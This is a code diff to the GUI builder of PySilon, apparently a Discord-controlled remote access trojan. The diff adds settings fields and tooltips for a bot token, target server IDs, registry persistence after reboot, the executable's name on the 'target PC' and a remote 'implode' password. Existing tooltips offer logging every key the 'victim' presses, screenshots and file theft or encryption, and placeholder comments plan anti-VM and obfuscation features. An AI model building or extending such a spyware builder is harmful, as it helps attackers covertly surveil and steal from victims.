@@ -8,6 +8,12 @@ import tkinter.font as tkFont
 from PIL import Image, ImageTk, ImageFont
 
 tooltips = {
+    'token_entry': 'Token obtained from Discord Developer Portal.',
+    'guildids_entry': 'Target server IDs that will be used by PySilon. You can add more servers by separating them with semicolon(;).',
+    'registry_entry': 'Name of PySilon\'s entry in Registry Editor. Filling this field is required if you want PySilon to run after reboot.',
+    'directory_entry': 'Name of directory that will be created in "C:\\Users\\%username%" and used by PySilon.',
+    'executable_entry': 'Name of executable that will contain PySilon on target PC. NOTE: Don\'t include ".exe" extension.',
+    'implode_entry': 'A secret key that will be required to remotely remove PySilon from a PC using ".implode" command.',
     'keylogr': 'Log every key pressed by victim.',
     'scrnsht': 'Take screenshot of victim\'s PC',
     'f_manag': 'Explore, download, upload, remove or encrypt files.',
@@ -50,6 +56,7 @@ class Builder:
             'registry_name': '',
             'directory_name': '',
             'executable_name': '',
+            'implode_secret': '',
             'icon_path': '',
             'functionalities': {
                 'keylogr': True,
@@ -105,7 +112,7 @@ class Builder:
             text='Functionality Settings',
             font=tkFont.Font(family='Consolas', size=10),
             disabledforeground='white',
-            command=self.functionality_settings_click
+            command=self.functionality_settings
             )
         self.functionality_settings_button.place(x=135, y=0, width=175, height=40)
 
@@ -114,7 +121,7 @@ class Builder:
             text='Compiling Settings',
             font=tkFont.Font(family='Consolas', size=10),
             disabledforeground='white',
-            command=self.compiling_settings_click
+            command=self.compiling_settings
             )
         self.compiling_settings_button.place(x=310, y=0, width=145, height=40)
 
@@ -149,6 +156,7 @@ class Builder:
             self.configuration['registry_name'] = self.registry_entry.get()
             self.configuration['directory_name'] = self.directory_entry.get()
             self.configuration['executable_name'] = self.executable_entry.get()
+            self.configuration['implode_secret'] = self.implode_entry.get()
         except: pass
         try:
             print(self.cbvar_keylogr.get())
@@ -161,7 +169,6 @@ class Builder:
         with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'r', encoding='utf-8') as configuration_file:
             self.configuration = json.loads(''.join(configuration_file.readlines()))
         
-
     def general_settings(self):
         self.general_settings_button['state'] = tk.DISABLED
         self.general_settings_button['relief'] = 'flat'
@@ -173,10 +180,12 @@ class Builder:
         self.new_background()
         self.load_configuration(True)
 
-        self.canvas.create_text(220, 140, text='BOT Token:', fill='white', font=('Consolas', 16), anchor=tk.E)
-        self.token_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
+        self.canvas.create_text(230, 140, text='BOT Token:', fill='white', font=('Consolas', 16), anchor=tk.E)
+        self.token_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33, show='*')
         self.token_entry.insert(0, self.configuration['token'])
-        self.canvas.create_window(225, 140, window=self.token_entry, anchor='w')
+        self.token_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['token_entry']))
+        self.token_entry.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(235, 140, window=self.token_entry, anchor='w')
         self.paste_token_icon = tk.PhotoImage(file='resources/assets/builder_elements/paste_icon.png')
         self.paste_token_button = tk.Button(
             self.canvas,
@@ -187,27 +196,43 @@ class Builder:
             height=15,
             command=self.paste_token
             )
-        self.canvas.create_window(630, 140, window=self.paste_token_button, anchor='w')
+        self.canvas.create_window(640, 140, window=self.paste_token_button, anchor='w')
  
-        self.canvas.create_text(220, 170, text='Guild IDs:', fill='white', font=('Consolas', 16), anchor=tk.E)
+        self.canvas.create_text(230, 170, text='Guild IDs:', fill='white', font=('Consolas', 16), anchor=tk.E)
         self.guildids_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
         self.guildids_entry.insert(0, self.configuration['guild_ids'])
-        self.canvas.create_window(225, 170, window=self.guildids_entry, anchor='w')
+        self.guildids_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['guildids_entry']))
+        self.guildids_entry.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(235, 170, window=self.guildids_entry, anchor='w')
 
-        self.canvas.create_text(220, 200, text='Registry Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
+        self.canvas.create_text(230, 200, text='Registry Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
         self.registry_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
         self.registry_entry.insert(0, self.configuration['registry_name'])
-        self.canvas.create_window(225, 200, window=self.registry_entry, anchor='w')
+        self.registry_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['registry_entry']))
+        self.registry_entry.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(235, 200, window=self.registry_entry, anchor='w')
 
-        self.canvas.create_text(220, 230, text='Directory Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
+        self.canvas.create_text(230, 230, text='Directory Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
         self.directory_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
         self.directory_entry.insert(0, self.configuration['directory_name'])
-        self.canvas.create_window(225, 230, window=self.directory_entry, anchor='w')
+        self.directory_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['directory_entry']))
+        self.directory_entry.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(235, 230, window=self.directory_entry, anchor='w')
 
-        self.canvas.create_text(220, 260, text='Executable Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
-        self.executable_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
+        self.canvas.create_text(230, 260, text='Executable Name:', fill='white', font=('Consolas', 16), anchor=tk.E)
+        self.executable_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=28)
         self.executable_entry.insert(0, self.configuration['executable_name'])
-        self.canvas.create_window(225, 260, window=self.executable_entry, anchor='w')
+        self.executable_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['executable_entry']))
+        self.executable_entry.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(235, 260, window=self.executable_entry, anchor='w')
+        self.canvas.create_text(580, 260, text='.exe', fill='white', font=('Consolas', 16), anchor=tk.W)
+
+        self.canvas.create_text(230, 290, text='Implode Password:', fill='white', font=('Consolas', 16), anchor=tk.E)
+        self.implode_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33, show='*')
+        self.implode_entry.insert(0, self.configuration['implode_secret'])
+        self.implode_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['implode_entry']))
+        self.implode_entry.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(235, 290, window=self.implode_entry, anchor='w')
 
 
     def show_tooltip(self, event, tooltip_text):
@@ -220,7 +245,7 @@ class Builder:
     def paste_token(self):
         self.token_entry.insert(0, pyperclip.paste())
 
-    def functionality_settings_click(self):
+    def functionality_settings(self):
         self.general_settings_button['state'] = tk.NORMAL
         self.general_settings_button['relief'] = 'groove'
         self.functionality_settings_button ['state'] = tk.DISABLED
@@ -550,7 +575,7 @@ class Builder:
 
 
 
-    def compiling_settings_click(self):
+    def compiling_settings(self):
         self.general_settings_button['state'] = tk.NORMAL
         self.general_settings_button['relief'] = 'groove'
         self.functionality_settings_button ['state'] = tk.NORMAL
@@ -559,6 +584,14 @@ class Builder:
         self.compiling_settings_button['relief'] = 'flat'
         self.new_background()
         self.canvas.create_text(200, 150, text='Content for Button 3', font=('Helvetica', 16), fill='red')
+
+        # Icon
+        # Anti-VM
+        # Obfuscation
+
+
+
+
 
 def main():
     root = tk.Tk()
